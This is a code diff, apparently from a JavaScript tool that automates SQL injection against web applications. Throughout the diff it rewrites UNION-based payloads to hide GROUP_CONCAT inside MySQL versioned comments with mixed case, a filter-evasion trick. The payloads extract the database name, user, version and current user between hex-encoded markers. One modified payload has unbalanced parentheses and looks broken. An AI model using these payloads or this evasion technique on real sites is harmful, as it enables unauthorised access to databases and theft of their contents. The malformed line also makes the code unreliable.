@@ -130,7 +130,7 @@ sql_errors1 = ['Convo Not found!','rowCount()', 'RecordCount()', 'ERROR:', 'Warn
                     if (i2 != i) {
                         stringcolunas = stringcolunas + i2
                     } else {
-                        stringcolunas = stringcolunas + 'GrOUp_COnCaT(0x6D7973716C6E6F74726F6E3D3E, '+ i + ",0x3a,0x3a, 0x3C3D6D7973716C6E6F74726F6E)"
+                        stringcolunas = stringcolunas + '/*!50000gROup_cONcat(GrOUp_COnCaT(0x6D7973716C6E6F74726F6E3D3E, '+ i + ",0x3a,0x3a, 0x3C3D6D7973716C6E6F74726F6E)*/"
                     }
                     if( i2 < colunas ){
                         stringcolunas = stringcolunas + ','
@@ -153,7 +153,7 @@ sql_errors1 = ['Convo Not found!','rowCount()', 'RecordCount()', 'ERROR:', 'Warn
     async function InjetandoColuna(url,colunas,idresponse) {
         console.log("Resonse ID Localizado em:",idresponse)
         var stringcolunas = '';
-        var injection = 'GrOUp_COnCaT(0x6D7973716C6E6F74726F6E3D3E, database(), 0x3a, user(), 0x3a, Version(), 0x3a, current_user(), 0x3C3D6D7973716C6E6F74726F6E)'
+        var injection = '/*!50000gROup_cONcat(0x6D7973716C6E6F74726F6E3D3E, database(), 0x3a, user(), 0x3a, Version(), 0x3a, current_user(), 0x3C3D6D7973716C6E6F74726F6E)*/'
         for (i2 = 1; i2 < colunas + 1; i2++) {
             if (i2 != idresponse) {
                 stringcolunas = stringcolunas + i2
